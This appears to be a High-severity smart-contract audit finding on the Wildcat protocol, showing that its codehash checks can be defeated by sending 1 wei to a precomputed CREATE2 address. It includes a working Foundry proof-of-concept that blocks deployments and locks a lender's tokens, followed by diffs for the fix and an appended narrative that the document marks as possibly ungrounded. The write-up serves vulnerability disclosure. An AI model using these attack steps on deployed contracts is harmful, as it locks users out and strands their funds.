---
id: 19449
severity: "High"
---

# `codehash` check in factory contracts does not account for non-empty addresses

## Description

```solidity
In `WildcatMarketControllerFactory.sol`, registered borrowers can call `deployController()` to deploy a `WildcatMarketController` contract for themselves.

The function checks if the `codehash` of the controller address is `bytes32(0)` to determine if the controller has already been deployed:

[WildcatMarketControllerFactory.sol#L287-L296](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketControllerFactory.sol#L287-L296)
    
    // Salt is borrower address
    bytes32 salt = bytes32(uint256(uint160(msg.sender)));
    controller = LibStoredInitCode.calculateCreate2Address(
        ownCreate2Prefix,
        salt,
        controllerInitCodeHash
    );
    if (controller.codehash != bytes32(0)) { // auditor: This check
        revert ControllerAlreadyDeployed();
    }

This same check is also used in `deployMarket()`, which is called by borrowers to deploy markets:

[WildcatMarketController.sol#L349-L353](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L349-L353)
    
    bytes32 salt = _deriveSalt(asset, namePrefix, symbolPrefix);
    market = LibStoredInitCode.calculateCreate2Address(ownCreate2Prefix, salt, marketInitCodeHash);
    if (market.codehash != bytes32(0)) {
        revert MarketAlreadyDeployed();
    }

This check also exists in `createEscrow()`, which is called by markets to deploy an escrow contract whenever a sanctioned lender gets blocked:

[WildcatSanctionsSentinel.sol#L104-L106](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatSanctionsSentinel.sol#L104-L106)
    
    escrowContract = getEscrowAddress(borrower, account, asset);
    
    if (escrowContract.codehash != bytes32(0)) return escrowContract;
```
However, this `<address>.codehash != bytes32(0)` check is insufficient to determine if an address has existing code. According to [EIP-1052](https://eips.ethereum.org/EIPS/eip-1052), addresses without code only return a `0x0` codehash when they are **empty**:

In case the account does not exist or is empty (as defined by [EIP-161](https://eips.ethereum.org/EIPS/eip-161)) `0` is pushed to the stack.

In case the account does not have code the keccak256 hash of empty data (i.e. `c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470`) is pushed to the stack.

As seen from above, addresses without code can also return `keccak256("")` as its `codehash` if it is non-empty. [EIP-161](https://eips.ethereum.org/EIPS/eip-161) states that an address must have a zero ETH balance for it to be empty:

An account is considered _empty_ when it has **no code** and **zero nonce** and **zero balance**.

As such, if anyone transfers 1 wei to an address, `.codehash` will return `keccak256("")` instead of `bytes32(0)`, making the checks shown above pass incorrectly.

Since all contract deployments in the protocol use `CREATE2`, a malicious attacker can harm users by doing the following:

  * For controller deployments:

    * Attacker calls [`computeControllerAddress()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketControllerFactory.sol#L342-L347) to compute the controller address for a borrower.
    * Attacker transfers 1 wei to it, causing `.codehash` to become non-zero.
    * When `deployController()` is called by the borrower, the check passes, causing the function to revert.
  * For market deployments:

    * Attacker calls [`computeMarketAddress()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L221-L228) with arguments such that the deployment salt is the same.
    * Attacker transfers 1 wei to the resulting market address, causing `.codehash` to become non-zero.
    * When `deployMarket()` is called by the borrower, the function reverts.
  * For escrow deployments:

    * Attacker calls [`getEscrowAddress()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatSanctionsSentinel.sol#L61-L85) with the `borrower`, sanctioned `lender` and market/asset address to compute the resulting escrow address.
    * Attacker transfers 1 wei to the escrow address, causing `.codehash` to become non-zero.
    * When either [`nukeFromOrbit()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketConfig.sol#L74-L81) or [`executeWithdrawal()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketWithdrawals.sol#L123-L188) is called, `createEscrow()` simply returns the escrow address instead of deploying an escrow contract.
    * The market tokens and/or funds of the lender are transferred to the escrow address, causing them to be unrecoverable since the escrow contract was never deployed.

Note that for controller deployments, since the salt is fixed to the `borrower` address and cannot be varied, the DOS for `deployController()` is permanent. This effectively locks the `borrower` out of all protocol functionality forever since they can never deploy a market controller for themselves.

## Proof of Concept

```solidity
The code below contains three tests:

  * `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.
  * `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.
  * `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if they get blocked, causing their market tokens to be unrecoverable.

    // SPDX-License-Identifier: MIT
    pragma solidity >=0.8.20;
    
    import 'src/WildcatSanctionsSentinel.sol';
    import 'src/WildcatArchController.sol';
    import 'src/WildcatMarketControllerFactory.sol';
    import 'src/interfaces/IWildcatMarketControllerEventsAndErrors.sol';
    
    import 'forge-std/Test.sol';
    import 'test/shared/TestConstants.sol';
    import 'test/helpers/MockERC20.sol';
    
    contract CodeHashTest is Test, IWildcatMarketControllerEventsAndErrors {
        // Wildcat contracts
        address MOCK_CHAINALYSIS_ADDRESS = address(0x1337);
        WildcatSanctionsSentinel sentinel;
        WildcatArchController archController;
        WildcatMarketControllerFactory controllerFactory;
        
        // Test contracts
        MockERC20 asset;
    
        // Users
        address AIKEN;
        address DUEET;
    
        function setUp() external {
            // Deploy Wildcat contracts
            archController = new WildcatArchController();
            sentinel = new WildcatSanctionsSentinel(address(archController), MOCK_CHAINALYSIS_ADDRESS);
            MarketParameterConstraints memory constraints = MarketParameterConstraints({
                minimumDelinquencyGracePeriod: MinimumDelinquencyGracePeriod,
                maximumDelinquencyGracePeriod: MaximumDelinquencyGracePeriod,
                minimumReserveRatioBips: MinimumReserveRatioBips,
                maximumReserveRatioBips: MaximumReserveRatioBips,
                minimumDelinquencyFeeBips: MinimumDelinquencyFeeBips,
                maximumDelinquencyFeeBips: MaximumDelinquencyFeeBips,
                minimumWithdrawalBatchDuration: MinimumWithdrawalBatchDuration,
                maximumWithdrawalBatchDuration: MaximumWithdrawalBatchDuration,
                minimumAnnualInterestBips: MinimumAnnualInterestBips,
                maximumAnnualInterestBips: MaximumAnnualInterestBips
            });
            controllerFactory = new WildcatMarketControllerFactory(
                address(archController),
                address(sentinel),
                constraints
            );
    
            // Register controllerFactory in archController
            archController.registerControllerFactory(address(controllerFactory));
    
            // Deploy asset token
            asset = new MockERC20();
    
            // Setup Aiken and register him as borrower
            AIKEN = makeAddr("AIKEN");
            archController.registerBorrower(AIKEN);
    
            // Setup Dueet and give him some asset token
            DUEET = makeAddr("DUEET");
            asset.mint(DUEET, 1000e18);
        }
    
        function test_CanDOSControllerDeployment() public {
            // Dueet front-runs Aiken and transfers 1 wei to Aiken's controller address
            address controllerAddress = controllerFactory.computeControllerAddress(AIKEN);
            payable(controllerAddress).transfer(1);
    
            // Codehash of Aiken's controller address is now keccak256("")
            assertEq(controllerAddress.codehash, keccak256(""));
    
            // Aiken calls deployController(), but it reverts due to non-zero codehash
            vm.prank(AIKEN);
            vm.expectRevert(WildcatMarketControllerFactory.ControllerAlreadyDeployed.selector);
            controllerFactory.deployController();
        }
    
        function test_CanDOSMarketDeployment() public {
            // Deploy WildcatMarketController for Aiken
            (WildcatMarketController controller, ) = _deployControllerAndMarket(
                AIKEN,
                address(0),
                "_",
                "_"
            );
    
            // Dueet front-runs Aiken and transfers 1 wei to market address
            string memory namePrefix = "Market Token";
            string memory symbolPrefix = "MKT";
            address marketAddress = controller.computeMarketAddress(
                address(asset), 
                namePrefix, 
                symbolPrefix
            );
            payable(marketAddress).transfer(1);
    
            // Codehash of market address is now keccak256("")
            assertEq(marketAddress.codehash, keccak256(""));
    
            // Aiken calls deployMarket(), but it reverts due to non-zero codehash
            vm.prank(AIKEN);
            vm.expectRevert(MarketAlreadyDeployed.selector);
            controller.deployMarket(
                address(asset),
                namePrefix,
                symbolPrefix,
                type(uint128).max,
                MaximumAnnualInterestBips,
                MaximumDelinquencyFeeBips,
                MaximumWithdrawalBatchDuration,
                MaximumReserveRatioBips,
                MaximumDelinquencyGracePeriod
            );
        }
    
        function test_CanSkipEscrowDeployment() public {
            // Deploy WildcatMarketController and WildcatMarket for Aiken
            (WildcatMarketController controller, WildcatMarket market) = _deployControllerAndMarket(
                AIKEN,
                address(asset),
                "Market Token",
                "MKT"
            );
    
            // Register Dueet as lender
            address[] memory arr = new address[](1);
            arr[0] = DUEET;
            vm.prank(AIKEN);
            controller.authorizeLenders(arr);
    
            // Dueet becomes a lender in the market
            vm.startPrank(DUEET);
            asset.approve(address(market), 1000e18);
            market.depositUpTo(1000e18);
            vm.stopPrank();
    
            // Dueet becomes sanctioned
            vm.mockCall(
                MOCK_CHAINALYSIS_ADDRESS,
                abi.encodeCall(IChainalysisSanctionsList.isSanctioned, (DUEET)),
                abi.encode(true)
            );
    
            // Attacker transfers 1 wei to Dueet's escrow address
            // Note: Borrower and lender addresses are swapped due to a separate bug
            address escrowAddress = sentinel.getEscrowAddress(DUEET, AIKEN, address(market));
            payable(escrowAddress).transfer(1);
    
            // Codehash of market address is now keccak256("")
            assertEq(escrowAddress.codehash, keccak256(""));
    
            // Dueet gets blocked in market
            market.nukeFromOrbit(DUEET);
    
            // Dueet's MKT tokens are transferred to his escrow address
            assertEq(market.balanceOf(escrowAddress), 1000e18);
    
            // However, the escrow contract was not deployed
            assertEq(escrowAddress.code.length, 0); 
        }
    
        function _deployControllerAndMarket(
            address user, 
            address _asset,
            string memory namePrefix, 
            string memory symbolPrefix
        ) internal returns (WildcatMarketController, WildcatMarket){
            vm.prank(user);
            (address controller, address market) = controllerFactory.deployControllerAndMarket(
                namePrefix,
                symbolPrefix,
                _asset,
                type(uint128).max,
                MaximumAnnualInterestBips,
                MaximumDelinquencyFeeBips,
                MaximumWithdrawalBatchDuration,
                MaximumReserveRatioBips,
                MaximumDelinquencyGracePeriod
            );
            return (WildcatMarketController(controller), WildcatMarket(market));
        }
    }
```

## Recommendation

```solidity
Consider checking if the codehash of an address is not `keccak256("")` as well:

[WildcatMarketControllerFactory.sol#L294-L296](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketControllerFactory.sol#L294-L296)
    
    -   if (controller.codehash != bytes32(0)) {
    +   if (controller.codehash != bytes32(0) && controller.codehash != keccak256("")) {
          revert ControllerAlreadyDeployed();
        }

[WildcatMarketController.sol#L351-L353](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L351-L353)
    
    -   if (market.codehash != bytes32(0)) {
    +   if (market.codehash != bytes32(0) && market.codehash != keccak256("")) {
          revert MarketAlreadyDeployed();
        }

[WildcatSanctionsSentinel.sol#L106](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatSanctionsSentinel.sol#L106)
    
    -   if (escrowContract.codehash != bytes32(0)) return escrowContract;
    +   if (escrowContract.codehash != bytes32(0) && escrowContract.codehash != keccak256("")) return escrowContract;
```
Alternatively, use `<address>.code.length != 0` to check if an address has code instead.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability stems from an incorrect assumption about the semantics of the .codehash property used in several factory contracts. The code checks whether an address already hosts a contract by comparing its codehash to bytes32(0). According to EIP‑1052, an address that has no code returns the hash of empty data (keccak256("") ) when the account exists but is not empty, i.e., it has a non‑zero balance or a non‑zero nonce. Consequently, an address that has received even a single wei will report a non‑zero codehash even though no contract code is present. The factory functions – deployController, deployMarket and createEscrow – rely on the .codehash != bytes32(0) test to decide whether a CREATE2 deployment is allowed. An attacker can pre‑emptively fund the deterministic address that will be generated by CREATE2, causing its codehash to become keccak256("") . When the legitimate borrower later calls the deployment function, the check incorrectly believes a contract already exists and reverts with ControllerAlreadyDeployed or MarketAlreadyDeployed, or in the escrow case it skips contract creation and returns the address. This results in a denial‑of‑service condition: the borrower can never deploy a controller, markets cannot be created, and escrow contracts are never instantiated, leaving any tokens sent to the escrow address permanently locked because no code can handle withdrawals. The issue manifests only when the deterministic address is funded before the legitimate call, which is feasible because the salt is derived from known values (borrower address, asset, name, etc.). Users experience failed transactions with error messages indicating the contract already exists, or see their market tokens disappear into an address with no code. The bug was discovered during a security audit that included unit tests reproducing the front‑running scenario. It is hard to notice because checking .codehash against zero is a common pattern and developers may overlook the special case defined by EIP‑1052. The proper fix is to treat both bytes32(0) and keccak256("") as indicators of an empty account, or to use address.code.length != 0 for a more reliable presence‑of‑code test. By correcting the empty‑address detection, the factories will no longer reject legitimate deployments and escrow contracts will be correctly created, preserving protocol functionality and user funds.
